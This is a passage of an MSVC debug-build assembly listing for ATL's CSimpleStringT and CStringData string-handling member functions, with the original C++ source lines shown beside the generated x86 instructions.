  0003d	e8 00 00 00 00	 call	 ?GetString@?$CSimpleStringT@D$0A@@ATL@@QBEPBDXZ ; ATL::CSimpleStringT<char,0>::GetString
  00042	8b 4d 08	 mov	 ecx, DWORD PTR _pszSrc$[ebp]
  00045	2b c8		 sub	 ecx, eax
  00047	89 4d f4	 mov	 DWORD PTR _nOffset$2[ebp], ecx

; 625  : 			// If 0 <= nOffset <= nOldLength, then pszSrc points into our
; 626  : 			// buffer
; 627  : 
; 628  : 			PXSTR pszBuffer = GetBuffer( nLength );

  0004a	8b 45 0c	 mov	 eax, DWORD PTR _nLength$[ebp]
  0004d	50		 push	 eax
  0004e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?GetBuffer@?$CSimpleStringT@D$0A@@ATL@@QAEPADH@Z ; ATL::CSimpleStringT<char,0>::GetBuffer
  00056	89 45 f0	 mov	 DWORD PTR _pszBuffer$1[ebp], eax

; 629  : 			if( nOffset <= nOldLength )

  00059	8b 45 f4	 mov	 eax, DWORD PTR _nOffset$2[ebp]
  0005c	3b 45 f8	 cmp	 eax, DWORD PTR _nOldLength$3[ebp]
  0005f	77 22		 ja	 SHORT $LN5@SetString

; 630  : 			{
; 631  : 				CopyCharsOverlapped( pszBuffer, GetAllocLength(),

  00061	8b 45 0c	 mov	 eax, DWORD PTR _nLength$[ebp]
  00064	50		 push	 eax
  00065	8b 4d f0	 mov	 ecx, DWORD PTR _pszBuffer$1[ebp]
  00068	03 4d f4	 add	 ecx, DWORD PTR _nOffset$2[ebp]
  0006b	51		 push	 ecx
  0006c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0006f	e8 00 00 00 00	 call	 ?GetAllocLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ ; ATL::CSimpleStringT<char,0>::GetAllocLength
  00074	50		 push	 eax
  00075	8b 55 f0	 mov	 edx, DWORD PTR _pszBuffer$1[ebp]
  00078	52		 push	 edx
  00079	e8 00 00 00 00	 call	 ?CopyCharsOverlapped@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z ; ATL::CSimpleStringT<char,0>::CopyCharsOverlapped
  0007e	83 c4 10	 add	 esp, 16			; 00000010H

; 632  : 					pszBuffer+nOffset, nLength );
; 633  : 			}

  00081	eb 1d		 jmp	 SHORT $LN6@SetString
$LN5@SetString:

; 634  : 			else
; 635  : 			{
; 636  : 				CopyChars( pszBuffer, GetAllocLength(), pszSrc, nLength );

  00083	8b 45 0c	 mov	 eax, DWORD PTR _nLength$[ebp]
  00086	50		 push	 eax
  00087	8b 4d 08	 mov	 ecx, DWORD PTR _pszSrc$[ebp]
  0008a	51		 push	 ecx
  0008b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0008e	e8 00 00 00 00	 call	 ?GetAllocLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ ; ATL::CSimpleStringT<char,0>::GetAllocLength
  00093	50		 push	 eax
  00094	8b 55 f0	 mov	 edx, DWORD PTR _pszBuffer$1[ebp]
  00097	52		 push	 edx
  00098	e8 00 00 00 00	 call	 ?CopyChars@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z ; ATL::CSimpleStringT<char,0>::CopyChars
  0009d	83 c4 10	 add	 esp, 16			; 00000010H
$LN6@SetString:

; 637  : 			}
; 638  : 			ReleaseBufferSetLength( nLength );

  000a0	8b 45 0c	 mov	 eax, DWORD PTR _nLength$[ebp]
  000a3	50		 push	 eax
  000a4	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000a7	e8 00 00 00 00	 call	 ?ReleaseBufferSetLength@?$CSimpleStringT@D$0A@@ATL@@QAEXH@Z ; ATL::CSimpleStringT<char,0>::ReleaseBufferSetLength
$LN7@SetString:

; 639  : 		}
; 640  : 	}

  000ac	5f		 pop	 edi
  000ad	5e		 pop	 esi
  000ae	5b		 pop	 ebx
  000af	8b e5		 mov	 esp, ebp
  000b1	5d		 pop	 ebp
  000b2	c2 08 00	 ret	 8
?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBDH@Z ENDP	; ATL::CSimpleStringT<char,0>::SetString
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_pszSrc$ = 8						; size = 4
?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBD@Z PROC	; ATL::CSimpleStringT<char,0>::SetString, COMDAT
; _this$ = ecx

; 601  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 602  : 		SetString( pszSrc, StringLength( pszSrc ) );

  0000c	8b 45 08	 mov	 eax, DWORD PTR _pszSrc$[ebp]
  0000f	50		 push	 eax
  00010	e8 00 00 00 00	 call	 ?StringLength@?$CSimpleStringT@D$0A@@ATL@@SAHPBD@Z ; ATL::CSimpleStringT<char,0>::StringLength
  00015	83 c4 04	 add	 esp, 4
  00018	50		 push	 eax
  00019	8b 4d 08	 mov	 ecx, DWORD PTR _pszSrc$[ebp]
  0001c	51		 push	 ecx
  0001d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00020	e8 00 00 00 00	 call	 ?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBDH@Z ; ATL::CSimpleStringT<char,0>::SetString

; 603  : 	}

  00025	5f		 pop	 edi
  00026	5e		 pop	 esi
  00027	5b		 pop	 ebx
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBD@Z ENDP	; ATL::CSimpleStringT<char,0>::SetString
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?ReleaseBufferSetLength@?$CSimpleStringT@D$0A@@ATL@@QAEXH@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_nNewLength$ = 8					; size = 4
?ReleaseBufferSetLength@?$CSimpleStringT@D$0A@@ATL@@QAEXH@Z PROC ; ATL::CSimpleStringT<char,0>::ReleaseBufferSetLength, COMDAT
; _this$ = ecx

; 566  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 567  : 		ATLASSERT( nNewLength >= 0 );
; 568  : 		SetLength( nNewLength );

  0000c	8b 45 08	 mov	 eax, DWORD PTR _nNewLength$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ?SetLength@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ; ATL::CSimpleStringT<char,0>::SetLength

; 569  : 	}

  00018	5f		 pop	 edi
  00019	5e		 pop	 esi
  0001a	5b		 pop	 ebx
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 04 00	 ret	 4
?ReleaseBufferSetLength@?$CSimpleStringT@D$0A@@ATL@@QAEXH@Z ENDP ; ATL::CSimpleStringT<char,0>::ReleaseBufferSetLength
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?GetString@?$CSimpleStringT@D$0A@@ATL@@QBEPBDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?GetString@?$CSimpleStringT@D$0A@@ATL@@QBEPBDXZ PROC	; ATL::CSimpleStringT<char,0>::GetString, COMDAT
; _this$ = ecx

; 528  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 529  : 		return( m_pszData );

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 00		 mov	 eax, DWORD PTR [eax]

; 530  : 	}

  00011	5f		 pop	 edi
  00012	5e		 pop	 esi
  00013	5b		 pop	 ebx
  00014	8b e5		 mov	 esp, ebp
  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
?GetString@?$CSimpleStringT@D$0A@@ATL@@QBEPBDXZ ENDP	; ATL::CSimpleStringT<char,0>::GetString
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?GetLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?GetLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ PROC	; ATL::CSimpleStringT<char,0>::GetLength, COMDAT
; _this$ = ecx

; 518  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 519  : 		return( GetData()->nDataLength );

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00014	8b 40 04	 mov	 eax, DWORD PTR [eax+4]

; 520  : 	}

  00017	5f		 pop	 edi
  00018	5e		 pop	 esi
  00019	5b		 pop	 ebx
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
?GetLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ ENDP	; ATL::CSimpleStringT<char,0>::GetLength
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?GetBuffer@?$CSimpleStringT@D$0A@@ATL@@QAEPADH@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_nMinBufferLength$ = 8					; size = 4
?GetBuffer@?$CSimpleStringT@D$0A@@ATL@@QAEPADH@Z PROC	; ATL::CSimpleStringT<char,0>::GetBuffer, COMDAT
; _this$ = ecx

; 507  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 508  : 		return( PrepareWrite( nMinBufferLength ) );

  0000c	8b 45 08	 mov	 eax, DWORD PTR _nMinBufferLength$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ?PrepareWrite@?$CSimpleStringT@D$0A@@ATL@@AAEPADH@Z ; ATL::CSimpleStringT<char,0>::PrepareWrite

; 509  : 	}

  00018	5f		 pop	 edi
  00019	5e		 pop	 esi
  0001a	5b		 pop	 ebx
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 04 00	 ret	 4
?GetBuffer@?$CSimpleStringT@D$0A@@ATL@@QAEPADH@Z ENDP	; ATL::CSimpleStringT<char,0>::GetBuffer
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?GetAllocLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?GetAllocLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ PROC	; ATL::CSimpleStringT<char,0>::GetAllocLength, COMDAT
; _this$ = ecx

; 485  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 486  : 		return( GetData()->nAllocLength );

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00014	8b 40 08	 mov	 eax, DWORD PTR [eax+8]

; 487  : 	}

  00017	5f		 pop	 edi
  00018	5e		 pop	 esi
  00019	5b		 pop	 ebx
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
?GetAllocLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ ENDP	; ATL::CSimpleStringT<char,0>::GetAllocLength
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?Empty@?$CSimpleStringT@D$0A@@ATL@@QAEXXZ
_TEXT	SEGMENT
_pNewData$1 = -16					; size = 4
_pStringMgr$ = -12					; size = 4
_pOldData$ = -8						; size = 4
_this$ = -4						; size = 4
?Empty@?$CSimpleStringT@D$0A@@ATL@@QAEXXZ PROC		; ATL::CSimpleStringT<char,0>::Empty, COMDAT
; _this$ = ecx

; 436  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 437  : 		CStringData* pOldData = GetData();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00014	89 45 f8	 mov	 DWORD PTR _pOldData$[ebp], eax

; 438  : 		IAtlStringMgr* pStringMgr = pOldData->pStringMgr;

  00017	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  0001a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0001c	89 4d f4	 mov	 DWORD PTR _pStringMgr$[ebp], ecx

; 439  : 		if( pOldData->nDataLength == 0 )

  0001f	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  00022	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  00026	75 02		 jne	 SHORT $LN2@Empty

; 440  : 		{
; 441  : 			return;

  00028	eb 3f		 jmp	 SHORT $LN1@Empty
$LN2@Empty:

; 442  : 		}
; 443  : 
; 444  : 		if( pOldData->IsLocked() )

  0002a	8b 4d f8	 mov	 ecx, DWORD PTR _pOldData$[ebp]
  0002d	e8 00 00 00 00	 call	 ?IsLocked@CStringData@ATL@@QBE_NXZ ; ATL::CStringData::IsLocked
  00032	0f b6 c0	 movzx	 eax, al
  00035	85 c0		 test	 eax, eax
  00037	74 0c		 je	 SHORT $LN3@Empty

; 445  : 		{
; 446  : 			// Don't reallocate a locked buffer that's shrinking
; 447  : 			SetLength( 0 );

  00039	6a 00		 push	 0
  0003b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003e	e8 00 00 00 00	 call	 ?SetLength@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ; ATL::CSimpleStringT<char,0>::SetLength

; 448  : 		}

  00043	eb 24		 jmp	 SHORT $LN1@Empty
$LN3@Empty:

; 449  : 		else
; 450  : 		{
; 451  : 			pOldData->Release();

  00045	8b 4d f8	 mov	 ecx, DWORD PTR _pOldData$[ebp]
  00048	e8 00 00 00 00	 call	 ?Release@CStringData@ATL@@QAEXXZ ; ATL::CStringData::Release

; 452  : 			CStringData* pNewData = pStringMgr->GetNilString();

  0004d	8b 45 f4	 mov	 eax, DWORD PTR _pStringMgr$[ebp]
  00050	8b 10		 mov	 edx, DWORD PTR [eax]
  00052	8b 4d f4	 mov	 ecx, DWORD PTR _pStringMgr$[ebp]
  00055	8b 42 0c	 mov	 eax, DWORD PTR [edx+12]
  00058	ff d0		 call	 eax
  0005a	89 45 f0	 mov	 DWORD PTR _pNewData$1[ebp], eax

; 453  : 			Attach( pNewData );

  0005d	8b 45 f0	 mov	 eax, DWORD PTR _pNewData$1[ebp]
  00060	50		 push	 eax
  00061	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00064	e8 00 00 00 00	 call	 ?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z ; ATL::CSimpleStringT<char,0>::Attach
$LN1@Empty:

; 454  : 		}
; 455  : 	}

  00069	5f		 pop	 edi
  0006a	5e		 pop	 esi
  0006b	5b		 pop	 ebx
  0006c	8b e5		 mov	 esp, ebp
  0006e	5d		 pop	 ebp
  0006f	c3		 ret	 0
?Empty@?$CSimpleStringT@D$0A@@ATL@@QAEXXZ ENDP		; ATL::CSimpleStringT<char,0>::Empty
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ??4?$CSimpleStringT@D$0A@@ATL@@QAEAAV01@PBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_pszSrc$ = 8						; size = 4
??4?$CSimpleStringT@D$0A@@ATL@@QAEAAV01@PBD@Z PROC	; ATL::CSimpleStringT<char,0>::operator=, COMDAT
; _this$ = ecx

; 313  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 314  : 		SetString( pszSrc );

  0000c	8b 45 08	 mov	 eax, DWORD PTR _pszSrc$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBD@Z ; ATL::CSimpleStringT<char,0>::SetString

; 315  : 
; 316  : 		return( *this );

  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 317  : 	}

  0001b	5f		 pop	 edi
  0001c	5e		 pop	 esi
  0001d	5b		 pop	 ebx
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 04 00	 ret	 4
??4?$CSimpleStringT@D$0A@@ATL@@QAEAAV01@PBD@Z ENDP	; ATL::CSimpleStringT<char,0>::operator=
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ??1?$CSimpleStringT@D$0A@@ATL@@QAE@XZ
_TEXT	SEGMENT
_pData$ = -8						; size = 4
_this$ = -4						; size = 4
??1?$CSimpleStringT@D$0A@@ATL@@QAE@XZ PROC		; ATL::CSimpleStringT<char,0>::~CSimpleStringT<char,0>, COMDAT
; _this$ = ecx

; 260  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 261  : 		CStringData* pData = GetData();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00014	89 45 f8	 mov	 DWORD PTR _pData$[ebp], eax

; 262  : 		pData->Release();

  00017	8b 4d f8	 mov	 ecx, DWORD PTR _pData$[ebp]
  0001a	e8 00 00 00 00	 call	 ?Release@CStringData@ATL@@QAEXXZ ; ATL::CStringData::Release

; 263  : 	}

  0001f	5f		 pop	 edi
  00020	5e		 pop	 esi
  00021	5b		 pop	 ebx
  00022	8b e5		 mov	 esp, ebp
  00024	5d		 pop	 ebp
  00025	c3		 ret	 0
??1?$CSimpleStringT@D$0A@@ATL@@QAE@XZ ENDP		; ATL::CSimpleStringT<char,0>::~CSimpleStringT<char,0>
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ??0?$CSimpleStringT@D$0A@@ATL@@QAE@PAUIAtlStringMgr@1@@Z
_TEXT	SEGMENT
tv65 = -80						; size = 4
_pData$ = -12						; size = 4
___atl_condVal$1 = -8					; size = 4
_this$ = -4						; size = 4
_pStringMgr$ = 8					; size = 4
??0?$CSimpleStringT@D$0A@@ATL@@QAE@PAUIAtlStringMgr@1@@Z PROC ; ATL::CSimpleStringT<char,0>::CSimpleStringT<char,0>, COMDAT
; _this$ = ecx

; 203  : 	explicit CSimpleStringT(_Inout_ IAtlStringMgr* pStringMgr)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
$LN4@CSimpleStr:

; 204  : 	{
; 205  : 		ATLENSURE( pStringMgr != NULL );

  0000c	83 7d 08 00	 cmp	 DWORD PTR _pStringMgr$[ebp], 0
  00010	74 09		 je	 SHORT $LN10@CSimpleStr
  00012	c7 45 b0 01 00
	00 00		 mov	 DWORD PTR tv65[ebp], 1
  00019	eb 07		 jmp	 SHORT $LN11@CSimpleStr
$LN10@CSimpleStr:
  0001b	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR tv65[ebp], 0
$LN11@CSimpleStr:
  00022	8b 45 b0	 mov	 eax, DWORD PTR tv65[ebp]
  00025	89 45 f8	 mov	 DWORD PTR ___atl_condVal$1[ebp], eax
$LN5@CSimpleStr:
  00028	33 c0		 xor	 eax, eax
  0002a	75 fc		 jne	 SHORT $LN5@CSimpleStr
  0002c	83 7d f8 00	 cmp	 DWORD PTR ___atl_condVal$1[ebp], 0
  00030	75 0a		 jne	 SHORT $LN2@CSimpleStr
  00032	68 05 40 00 80	 push	 -2147467259		; 80004005H
  00037	e8 00 00 00 00	 call	 ?AtlThrowImpl@ATL@@YGXJ@Z ; ATL::AtlThrowImpl
$LN2@CSimpleStr:
  0003c	33 c0		 xor	 eax, eax
  0003e	75 cc		 jne	 SHORT $LN4@CSimpleStr

; 206  : 		CStringData* pData = pStringMgr->GetNilString();

  00040	8b 45 08	 mov	 eax, DWORD PTR _pStringMgr$[ebp]
  00043	8b 10		 mov	 edx, DWORD PTR [eax]
  00045	8b 4d 08	 mov	 ecx, DWORD PTR _pStringMgr$[ebp]
  00048	8b 42 0c	 mov	 eax, DWORD PTR [edx+12]
  0004b	ff d0		 call	 eax
  0004d	89 45 f4	 mov	 DWORD PTR _pData$[ebp], eax

; 207  : 		Attach( pData );

  00050	8b 45 f4	 mov	 eax, DWORD PTR _pData$[ebp]
  00053	50		 push	 eax
  00054	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00057	e8 00 00 00 00	 call	 ?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z ; ATL::CSimpleStringT<char,0>::Attach

; 208  : 	}

  0005c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
$LN9@CSimpleStr:
  0005f	5f		 pop	 edi
  00060	5e		 pop	 esi
  00061	5b		 pop	 ebx
  00062	8b e5		 mov	 esp, ebp
  00064	5d		 pop	 ebp
  00065	c2 04 00	 ret	 4
??0?$CSimpleStringT@D$0A@@ATL@@QAE@PAUIAtlStringMgr@1@@Z ENDP ; ATL::CSimpleStringT<char,0>::CSimpleStringT<char,0>
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?Release@CStringData@ATL@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?Release@CStringData@ATL@@QAEXXZ PROC			; ATL::CStringData::Release, COMDAT
; _this$ = ecx

; 85   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 86   : 		ATLASSERT( nRefs != 0 );
; 87   : 
; 88   : 		if( _InterlockedDecrement( &nRefs ) <= 0 )

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	83 c0 0c	 add	 eax, 12			; 0000000cH
  00012	83 c9 ff	 or	 ecx, -1
  00015	f0 0f c1 08	 lock	  xadd	 DWORD PTR [eax], ecx
  00019	49		 dec	 ecx
  0001a	85 c9		 test	 ecx, ecx
  0001c	7f 15		 jg	 SHORT $LN1@Release

; 89   : 		{
; 90   : 			pStringMgr->Free( this );

  0001e	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00021	50		 push	 eax
  00022	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00025	8b 11		 mov	 edx, DWORD PTR [ecx]
  00027	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0002a	8b 12		 mov	 edx, DWORD PTR [edx]
  0002c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0002e	8b 42 04	 mov	 eax, DWORD PTR [edx+4]
  00031	ff d0		 call	 eax
$LN1@Release:

; 91   : 		}
; 92   : 	}

  00033	5f		 pop	 edi
  00034	5e		 pop	 esi
  00035	5b		 pop	 ebx
  00036	8b e5		 mov	 esp, ebp
  00038	5d		 pop	 ebp
  00039	c3		 ret	 0
?Release@CStringData@ATL@@QAEXXZ ENDP			; ATL::CStringData::Release
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?IsShared@CStringData@ATL@@QBE_NXZ
_TEXT	SEGMENT
tv66 = -72						; size = 4
_this$ = -4						; size = 4
?IsShared@CStringData@ATL@@QBE_NXZ PROC			; ATL::CStringData::IsShared, COMDAT
; _this$ = ecx

; 72   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 73   : 		return( nRefs > 1 );

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	83 78 0c 01	 cmp	 DWORD PTR [eax+12], 1
  00013	7e 09		 jle	 SHORT $LN3@IsShared
  00015	c7 45 b8 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  0001c	eb 07		 jmp	 SHORT $LN4@IsShared
$LN3@IsShared:
  0001e	c7 45 b8 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN4@IsShared:
  00025	8a 45 b8	 mov	 al, BYTE PTR tv66[ebp]

; 74   : 	}

  00028	5f		 pop	 edi
  00029	5e		 pop	 esi
  0002a	5b		 pop	 ebx
  0002b	8b e5		 mov	 esp, ebp
  0002d	5d		 pop	 ebp
  0002e	c3		 ret	 0
?IsShared@CStringData@ATL@@QBE_NXZ ENDP			; ATL::CStringData::IsShared
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?IsLocked@CStringData@ATL@@QBE_NXZ
_TEXT	SEGMENT
tv66 = -72						; size = 4
_this$ = -4						; size = 4
?IsLocked@CStringData@ATL@@QBE_NXZ PROC			; ATL::CStringData::IsLocked, COMDAT
; _this$ = ecx

; 68   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 69   : 		return nRefs < 0;

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
